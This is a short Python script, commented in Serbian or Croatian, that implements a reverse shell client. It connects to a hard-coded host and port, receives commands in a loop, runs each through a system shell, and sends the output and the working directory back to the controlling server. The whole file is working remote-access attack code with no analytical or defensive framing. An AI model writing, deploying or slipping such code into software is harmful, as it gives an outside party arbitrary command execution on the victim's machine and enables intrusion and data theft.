import os
import socket
import subprocess

s = socket.socket()
host = '192.168.1.2'
port = 6769
s.connect((host, port))

# def start():
#     """
#     Uspostavlaj konekciju sa serverom i izvrsava date funkcije
#     `Connects to the server and executes commands that it is given`
#
#     [Obratiti paznju na shell!!!]
#
#     :return:
#     """
while True:
    data = s.recv(1024)
    if data.decode("utf-8") == "quit":
        break
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                               stdout=subprocess.PIPE, stderr= subprocess.PIPE,stdin=subprocess.PIPE)

        output_bytes = cmd.stdout.read() + cmd.stderr.read()

        #Mozemo ispisati kod klijenta ako zlimo da vidi sta se desava
        output_str = str(output_bytes, "utf=8")
        s.send(str.encode(output_str + str(os.getcwd()) + '>'))

s.close()

